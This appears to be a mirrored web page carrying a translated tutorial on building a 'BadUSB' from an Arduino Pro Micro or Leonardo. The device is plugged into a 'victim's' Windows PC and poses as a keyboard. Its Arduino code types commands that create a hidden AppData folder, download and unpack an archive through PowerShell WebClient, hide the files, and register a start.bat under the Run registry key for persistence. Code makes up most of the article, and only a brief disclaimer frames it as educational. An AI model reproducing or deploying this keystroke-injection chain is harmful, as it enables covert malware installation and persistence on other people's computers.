<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Homemade BadUSB on Arduino Pro Micro or Leonardo</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Introduction 
 Not so long ago, a movie about Spiderman appeared in our cinemas. The protagonist of the film using a device that looks like a flash dr...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Homemade BadUSB on Arduino Pro Micro or Leonardo</h1><div class="post__text post__text-html js-mediator-article"><h3>  Introduction </h3><br>  Not so long ago, a movie about Spiderman appeared in our cinemas.  The protagonist of the film using a device that looks like a flash drive, was able to hack the system and gain control over the beam, transferring between measurements.  The <a href="https://ru.aliexpress.com/store/product/LEONARDO-R3-ATmega32U4-Compatible-for-Arduino-Leonardo/1950989_32730987350.html%3Faf%3D56737%26cv%3D19568950%26cn%3D42pkx1eb1g1hp8219qtlrmmavc2ydmqp%26dp%3Dv5_42pkx1eb1g1hp8219qtlrmmavc2ydmqp%26af%3D56737%26cv%3D19568950%26cn%3D42pkx1eb1g1hp8219qtlrmmavc2ydmqp%26dp%3Dv5_42pkx1eb1g1hp8219qtlrmmavc2ydmqp%26afref%3D%26aff_platform%3Ddefault%26cpt%3D1546788179964%26sk%3DccfBY4yg%26aff_trace_key%3D470c8ee18e3b46778982be7b9ba3700c-1546788179964-07848-ccfBY4yg%26terminal_id%3Dc5083e173b664f999bd1281c64d30a7a">Arduino Leonardo</a> and <a href="https://ru.aliexpress.com/item/New-Pro-Micro-for-arduino-ATmega32U4-5V-16MHz-Module-with-2-row-pin-header-For-Leonardo/32768308647.html%3Fws_ab_test%3Dsearchweb0_0%2525252Csearchweb201602_5_10152_10065_10151_10068_10209_5430020_10307_10301_10137_10060_439_10155_10154_5370011_10056_10055_10054_10059_100031_10099_5400020_5410011_10103_10102_10169_10052_10053_10142_10107_10050_10051_5380020_10084_10083_10119_10080_10082_10081_10110_10111_10112_5390011_10113_10114_10311_10312_10313_10314_10315_10078_10079_10210_10073_10120_5420011_10125%2525252Csearchweb201603_5%2525252CppcSwitch_5%26btsid%3De3af7561-1a54-48d1-a981-bd61006144ad%26algo_expid%3Dc767b5a8-f731-475f-858b-6cbffa3824d3-1%26algo_pvid%3Dc767b5a8-f731-475f-858b-6cbffa3824d3%26af%3D937957%26cv%3D9268448%26cn%3D42pkx5fzywtmpv94usw5e345hfncbwaz%26dp%3Dv5_42pkx5fzywtmpv94usw5e345hfncbwaz%26af%3D937957%26cv%3D9268448%26cn%3D42pkx5fzywtmpv94usw5e345hfncbwaz%26dp%3Dv5_42pkx5fzywtmpv94usw5e345hfncbwaz%26afref%3D%26aff_platform%3Ddefault%26cpt%3D1546793424504%26sk%3DccfBY4yg%26aff_trace_key%3D638feef01f3a4adf99242dda10defbd5-1546793424504-00676-ccfBY4yg%26terminal_id%3Dc5083e173b664f999bd1281c64d30a7a">Arduino Pro Micro</a> (and almost all microcontrollers on a 32u4 chip) can be perceived by the system as input devices.  Therefore, such a device is quite realistic to make, and it will cost you only $ 3.  All that is needed for hacking is to go to the victim's computer, insert a ‚Äúflash drive‚Äù, wait 5 seconds, pull out and leave as if nothing had happened. <br><a name="habracut"></a><br><h3>  Disclaimer </h3><br>  This article is created solely for educational purposes.  I do not distribute malware or promote it.  Only you are responsible for the illegal use of such devices.  Use for health, but only for peaceful purposes.  When publishing a project created using this material, please indicate the link to this post or <a href="https://habr.com/users/alexcocos/">my profile.</a> <br><br><h3>  The idea of ‚Äã‚Äãthe project </h3><br>  Let's create the simplest BadUSB device on the Arduino Pro Micro or Leonardo, which when connected to a computer will be defined as a keyboard and enter commands at high speed.  In this example I will make a program that: <br><br>  1. Creates a folder in the user directory AppData <br>  2. Downloads archive into it with the necessary files from the Internet. <br>  3. Extracts files in the downloaded archive <br>  4. Register the required file to autoload <br>  5. Hides the folder and files in it and sweeps 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Pre zero stage </h3><br>  Open the Arduino IDE and in the Tools tab in the board selection, put the Arduino Leonardo.  Do not be surprised if Pro Micro is not listed as this microcontroller will be perceived by the system as Leonardo.  Now you can start programming our "good". <br><br><h3>  We write the backbone of the code </h3><br>  Connect the <a href="https://github.com/arduino-libraries/Keyboard">&lt;Keyboard.h&gt;</a> library to connect the controller as a keyboard to the victim‚Äôs computer.  In the function Void Setup, we write the standard connection code of the microcontroller as a keyboard.  We don‚Äôt need a Void Loop, but compile the sketch without it just won't work, so we‚Äôll leave this function empty.  As a result, we get the following skeleton: <br><br><pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;Keyboard.h&gt; void setup(){ Keyboard.begin(); delay(2000);} void loop(){}</span></span></span></span></code> </pre> <br><h3>  Run Win + R </h3><br>  Let's write a function to open the Run window using the Win + R keyboard shortcut. We‚Äôll need this function three times.  Everything is clear here.  Hold Win and press R: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">winPlusR</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ Keyboard.press(KEY_LEFT_GUI); Keyboard.press(<span class="hljs-string"><span class="hljs-string">'r'</span></span>); delay(<span class="hljs-number"><span class="hljs-number">45</span></span>); Keyboard.releaseAll(); delay(<span class="hljs-number"><span class="hljs-number">100</span></span>); }</code> </pre> <br><h3>  Create a folder </h3><br>  Now we almost do not need the knowledge of C ++ as the command input code is constantly repeated.  Now the main thing - knowledge of the command line Windows (cmd).  We think over the algorithm: launch the command line, go to the user's AppData directory, create a folder there and close the cmd window.  Then everything is simple - we give our microcontroller instructions on how to do it: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">createFolder</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ winPlusR(); <span class="hljs-comment"><span class="hljs-comment">//    Keyboard.println("cmd"); Keyboard.write(KEY_RETURN); delay(500); //      Keyboard.println("cd C:/Users/%USERNAME%/AppData"); Keyboard.write(KEY_RETURN); delay(100); //   mycat Keyboard.println("mkdir mycat"); Keyboard.write(KEY_RETURN); delay(100); //   Keyboard.println("exit"); Keyboard.write(KEY_RETURN); delay(200); }</span></span></code> </pre> <br><h3>  Download the archive </h3><br>  Downloading the archive with files turned out to be much more complicated than I thought.  The fact is that in the Windows command line there is no utility for downloading from the Internet.  Immediately I remembered the wget utility in Debian, but we only have access to the command line without the ability to install additional utilities.  Then I had to turn to PowerShell: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getFiles</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ winPlusR(); <span class="hljs-comment"><span class="hljs-comment">//  powershell Keyboard.println("powershell"); Keyboard.write(KEY_RETURN); delay(100); //    mycat Keyboard.println("cd C:/Users/%USERNAME%/AppData/mycat"); Keyboard.write(KEY_RETURN); delay(100); //   Keyboard.println("$download_url = 'http://google.by'"); Keyboard.write(KEY_RETURN); delay(100); //    Keyboard.println("$local_path = 'C:/Downloads/file.zip'"); Keyboard.write(KEY_RETURN); delay(100); //    Keyboard.println("$WebClient = New-Object System.Net.WebClient"); Keyboard.write(KEY_RETURN); delay(500); //   Keyboard.println("$WebClient.DownloadFile($download_url, $local_path)"); Keyboard.write(KEY_RETURN); delay(1250); //   Keyboard.println("Expand-Archive $file.zip"); Keyboard.write(KEY_RETURN); delay(750); //   Keyboard.println("exit"); Keyboard.write(KEY_RETURN); delay(200); }</span></span></code> </pre> <br><h3>  Many problems </h3><br>  Initially, I planned to do everything differently - add the PowerShell script to the autoload, which would download and unpack the archive on the next boot without any time limit.  But on most systems in the Windows family, PowerShell has a default set of maximum security policies that prohibit running ps1 scripts.  You can disable this restriction with the following command: <br><br><pre> <code class="bash hljs">powershell -Command Set-ExecutionPolicy RemoteSigned</code> </pre> <br>  But the bad luck is that you need administrator rights to run this command.  I had to download and unpack on the go.  But if you have access to the "admin", then you can safely redo the program under my first idea.  I hope the reader will figure out how to write the code on his own. <br><br>  But the trouble did not end there.  The fact is that the command for unpacking the archive does not work in older versions of Windows.  Therefore, if you are dealing with ancient versions of Windows, then instead of downloading the tool, contact a third-party archiver, for example 7-Zip: <br><br><pre> <code class="plaintext hljs">set-alias sz "$env:ProgramFiles\7-Zip\7z.exe" sz x -r C:/Users/%USERNAME%/AppData/mycat/file.zip</code> </pre> <br><h3>  Customize files </h3><br>  The hardest part is over.  We return to the usual command line, set the startup file to autoload and hide the folder and files in it by changing the attributes: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setUpFiles</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ winPlusR(); <span class="hljs-comment"><span class="hljs-comment">//    Keyboard.println("cmd"); Keyboard.write(KEY_RETURN); delay(100); //     Keyboard.println("cd C:/Users/%USERNAME%/AppData"); Keyboard.write(KEY_RETURN); delay(100); //      Keyboard.println("attrib +h mycat"); Keyboard.write(KEY_RETURN); delay(100); //     Keyboard.println("attrib +h mycat/"); Keyboard.write(KEY_RETURN); delay(100); //    Keyboard.println("reg add HKCU/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v 'wincore' /d 'C:/Users/%USERNAME%/AppData/mycat/start.bat'"); Keyboard.write(KEY_RETURN); delay(250); //     cmd Keyboard.println("cls &amp;&amp; exit"); Keyboard.write(KEY_RETURN); //   ""   }</span></span></code> </pre> <br><h3>  From pieces into one </h3><br>  Change the Void Setup to run the functions we wrote in turn: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setup</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ Keyboard.begin(); delay(<span class="hljs-number"><span class="hljs-number">2000</span></span>); createFolder(); getFiles(); setUpFiles(); }</code> </pre> <br><h3>  Conclusion </h3><br>  We wrote the simplest sketch for our ‚Äúflash drive‚Äù on the Arduino IDE.  You can connect it to the victim's PC using a standard miniUSB to USB adapter (preferably without a cable).  Use, but not for evil to others. </div><p>Source: <a href="https://habr.com/ru/post/435342/">https://habr.com/ru/post/435342/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../435332/index.html">I hate the keyboard</a></li>
<li><a href="../435334/index.html">Reaction to cold letters</a></li>
<li><a href="../435336/index.html">Something found: reports from Elasticsearch Moscow meetup in OZON</a></li>
<li><a href="../435338/index.html">Create an electronic timekeeping races</a></li>
<li><a href="../435340/index.html">Researcher posted an example of a working worm code for Facebook</a></li>
<li><a href="../435344/index.html">Amazon unveiled Showroom, or why we will soon be buying all the furniture online.</a></li>
<li><a href="../435346/index.html">Subscribe to Kafka via HTTP or how to simplify your own web-hooks</a></li>
<li><a href="../435348/index.html">Simple MCerver - a small shell for Minecraft server</a></li>
<li><a href="../435352/index.html">Conference DEFCON 18. Practical espionage using a mobile phone. Part 2</a></li>
<li><a href="../435354/index.html">Conference DEFCON 18. Practical espionage using a mobile phone. Part 1</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>